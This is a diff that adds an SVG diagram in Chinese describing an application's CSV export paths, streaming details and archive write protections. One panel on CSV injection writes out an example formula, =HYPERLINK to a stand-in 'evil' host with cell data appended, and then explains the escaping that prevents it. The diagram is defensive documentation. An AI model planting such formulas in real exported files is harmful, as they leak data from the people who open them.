@@ -1,0 +1,74 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 480" width="960" height="480" role="img" aria-label="导出的三条路径与归档的三层写保护">
+  <defs>
+    <marker id="b1" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L9,3 z" fill="#475569"/>
+    </marker>
+  </defs>
+  <rect x="0" y="0" width="960" height="480" fill="#ffffff"/>
+  <text x="480" y="30" text-anchor="middle" font-family="-apple-system, 'PingFang SC', sans-serif" font-size="19" font-weight="600" fill="#0f172a">导出是读路径，归档是写保护：两条不同的风险线</text>
+
+  <g font-family="-apple-system, 'PingFang SC', sans-serif" font-size="11.5">
+    <rect x="30" y="60" width="200" height="66" rx="10" fill="#eff6ff" stroke="#93b4f0"/>
+    <text x="130" y="84" text-anchor="middle" font-weight="600" fill="#1d4ed8">GET /export?format=csv</text>
+    <text x="130" y="104" text-anchor="middle" font-size="10" fill="#475569">≤5,000 行 / ≤5 MB</text>
+    <text x="130" y="120" text-anchor="middle" font-size="10" fill="#475569">同步流式返回</text>
+
+    <rect x="270" y="60" width="200" height="66" rx="10" fill="#fffbeb" stroke="#f0d8a8"/>
+    <text x="370" y="84" text-anchor="middle" font-weight="600" fill="#92400e">POST /export → 202</text>
+    <text x="370" y="104" text-anchor="middle" font-size="10" fill="#475569">export_job：queued→running</text>
+    <text x="370" y="120" text-anchor="middle" font-size="10" fill="#475569">文件落对象存储，7 天过期</text>
+
+    <rect x="510" y="60" width="200" height="66" rx="10" fill="#ecfdf5" stroke="#6ee7b7"/>
+    <text x="610" y="84" text-anchor="middle" font-weight="600" fill="#047857">GET /cards?cursor=</text>
+    <text x="610" y="104" text-anchor="middle" font-size="10" fill="#475569">给集成方的分页 API</text>
+    <text x="610" y="120" text-anchor="middle" font-size="10" fill="#475569">短期令牌，不是公开链接</text>
+
+    <rect x="750" y="60" width="180" height="66" rx="10" fill="#f8fafc" stroke="#cbd5e1"/>
+    <text x="840" y="84" text-anchor="middle" font-weight="600" fill="#0f172a">三条共用的</text>
+    <text x="840" y="104" text-anchor="middle" font-size="10" fill="#475569">租户条件 + 字段脱敏</text>
+    <text x="840" y="120" text-anchor="middle" font-size="10" fill="#475569">+ 审计</text>
+  </g>
+
+  <g font-family="-apple-system, 'PingFang SC', sans-serif" font-size="11">
+    <rect x="30" y="150" width="440" height="140" rx="10" fill="#f8fafc" stroke="#cbd5e1"/>
+    <text x="50" y="174" font-weight="600">流式导出：三个必须做对的细节</text>
+    <text x="50" y="198" font-size="10.5" fill="#475569">· 游标分批 1,000 行；JDBC 要 autoCommit=false 才真游标</text>
+    <text x="50" y="220" font-size="10.5" fill="#475569">· UTF-8 BOM（EF BB BF），Excel 打开中文不乱码</text>
+    <text x="50" y="242" font-size="10.5" fill="#475569">· 先写表头再取数据，异常时客户端能看出被截断</text>
+    <text x="50" y="266" font-size="10.5" fill="#92400e">实测：20 万行 / 26 MB / COPY 308.708 ms</text>
+    <text x="50" y="284" font-size="10.5" fill="#b91c1c">应用侧会比 COPY 慢 3~10 倍，别拿它当接口 SLA</text>
+
+    <rect x="490" y="150" width="440" height="140" rx="10" fill="#fef2f2" stroke="#fca5a5"/>
+    <text x="510" y="174" font-weight="600" fill="#b91c1c">CSV 注入：导出最容易被漏的攻击面</text>
+    <text x="510" y="198" font-size="10.5" fill="#475569">标题写 =HYPERLINK("http://evil/"&amp;A1,"点我")</text>
+    <text x="510" y="220" font-size="10.5" fill="#475569">Excel 打开即执行 → 外链 + 数据外带</text>
+    <text x="510" y="242" font-size="10.5" fill="#475569">转义：以 = + - @ \t \r 开头的前置单引号</text>
+    <text x="510" y="264" font-size="10.5" fill="#475569">再按 RFC 4180 处理逗号 / 双引号 / 换行</text>
+    <text x="510" y="286" font-size="10.5" fill="#b91c1c">「先查出来再替换」会漏新字段，脱敏放查询层</text>
+  </g>
+
+  <g font-family="-apple-system, 'PingFang SC', sans-serif" font-size="11.5">
+    <rect x="30" y="312" width="880" height="140" rx="12" fill="#eff6ff" stroke="#93b4f0"/>
+    <text x="50" y="336" font-weight="600" fill="#1d4ed8">归档的三层写保护（缺一层就有一条绕过路径）</text>
+
+    <rect x="50" y="350" width="270" height="86" rx="8" fill="#ffffff" stroke="#cbd5e1"/>
+    <text x="185" y="372" text-anchor="middle" font-weight="600" fill="#0f172a">① 应用层</text>
+    <text x="185" y="394" text-anchor="middle" font-size="10.5" fill="#475569">requireBoardWritable()</text>
+    <text x="185" y="414" text-anchor="middle" font-size="10.5" fill="#475569">返回 409 BOARD_ARCHIVED</text>
+
+    <rect x="345" y="350" width="270" height="86" rx="8" fill="#ffffff" stroke="#cbd5e1"/>
+    <text x="480" y="372" text-anchor="middle" font-weight="600" fill="#0f172a">② 数据库触发器</text>
+    <text x="480" y="394" text-anchor="middle" font-size="10.5" fill="#475569">BEFORE INSERT/UPDATE ON card</text>
+    <text x="480" y="414" text-anchor="middle" font-size="10.5" fill="#475569">绕过 Service 也拦得住</text>
+
+    <rect x="640" y="350" width="250" height="86" rx="8" fill="#ffffff" stroke="#cbd5e1"/>
+    <text x="765" y="372" text-anchor="middle" font-weight="600" fill="#0f172a">③ 权限矩阵 ⛔ 格</text>
+    <text x="765" y="394" text-anchor="middle" font-size="10.5" fill="#475569">18 格里逐个验证</text>
+    <text x="765" y="414" text-anchor="middle" font-size="10.5" fill="#475569">联调按格回归</text>
+  </g>
+
+  <g stroke="#475569" stroke-width="1.4" fill="none" marker-end="url(#b1)">
+    <line x1="230" y1="93" x2="266" y2="93"/>
+    <line x1="470" y1="93" x2="506" y2="93"/>
+  </g>
+</svg>
